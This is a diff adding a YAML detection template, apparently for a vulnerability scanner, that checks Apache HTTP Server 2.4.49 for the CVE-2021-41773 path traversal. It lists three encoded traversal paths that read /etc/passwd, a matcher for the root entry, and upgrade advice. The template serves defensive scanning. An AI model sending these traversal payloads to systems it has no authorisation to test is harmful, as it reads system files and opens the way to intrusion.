@@ -1,0 +1,19 @@
+id: PENTRAX-CVE-2021-41773
+name: Apache HTTP Server 2.4.49 Path Traversal & RCE
+severity: CRITICAL
+category: CVE
+http:
+  method: GET
+  paths:
+    - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+    - /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+    - /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
+  matchers:
+    - type: status
+      values: [200]
+    - type: regex
+      patterns:
+        - "root:.*:0:0:"
+remediation: Upgrade Apache HTTP Server to version 2.4.51 or later immediately.
+sla: 48 Hours
+
